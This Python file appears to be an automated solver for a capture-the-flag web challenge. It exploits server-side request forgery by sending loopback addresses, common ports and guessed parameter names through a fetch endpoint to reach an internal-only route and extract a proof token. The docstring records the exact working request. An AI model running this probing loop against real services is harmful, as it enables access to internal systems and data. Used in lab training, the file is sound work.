"""D24 "Fetch Quest" (web-exploitation-day-15-fetch-quest): SSRF to an internal-only route.

Kit shape: /api/clues = {framework, feature_route, secondary_route, current_role}; GET secondary_route -> 403
{"error":"internal_only"}; GET feature_route (no params) -> 400 {"error":"absolute_url_required"}; GET
feature_route?url=http://127.0.0.1:8080<secondary_route> -> {"ok":true,"effect":"internal_service_reached",
"evidence":"proof_..."}. The internal service listens on 8080 (measured single + TT); the default port
(127.0.0.1:80) returns {"error":"fetch_failed"}. Re-runnable on any fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve

HOSTS = ("http://127.0.0.1:8080", "http://localhost:8080", "http://127.0.0.1", "http://localhost",
         "http://127.0.0.1:5000", "http://127.0.0.1:8000", "http://127.0.0.1:3000")
PARAMS = ("url", "target", "uri", "link", "src", "endpoint")


def _route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v):
                return v
    return None


def ssrf(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    fetcher = _route(cl, r"feature|fetch|action|proxy")
    internal = _route(cl, r"secondary|internal|account|admin")
    if not fetcher:
        return None
    furl = urllib.parse.urljoin(base, fetcher)
    st, body, _ = websolve.fetch(furl)
    p = websolve.proof(body)
    if p:
        return p
    if not re.search(r"url|fetch|uri|target|link", body or "", re.I):
        return None   # not a server-side fetcher
    # the param the fetcher names in its error ("url_required", "missing target" ...), else the ladder
    named = [n for n in PARAMS if re.search(rf"\b{n}\b|{n}_", body or "", re.I)]
    params = list(dict.fromkeys(named + ["url"]))
    paths = [internal] if internal else []
    paths += [v for k, v in cl.items() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)
              and v not in (fetcher, internal, "/api/clues") and re.search(r"internal|admin|account|secret", v + k, re.I)]
    for path in dict.fromkeys(paths or ["/"]):
        for host in HOSTS:
            tgt = host + path
            for name in params:
                st, body, _ = websolve.fetch(f"{furl}?{urllib.parse.urlencode({name: tgt})}")
                p = websolve.proof(body)
                if p:
                    return p
                if st == 405:   # POST-only fetcher: form, then JSON
                    for data, hdrs in (({name: tgt}, None),
                                       (json.dumps({name: tgt}).encode(), {"Content-Type": "application/json"})):
                        p = websolve.proof(websolve.fetch(furl, hdrs, data=data, method="POST")[1])
                        if p:
                            return p
    return None


KEY_MAP = [(r"secondary_route|internal|ssrf|fetch|proxy", "day24_web_fetch_quest")]
HANDLERS = {"day24_web_fetch_quest": ssrf}
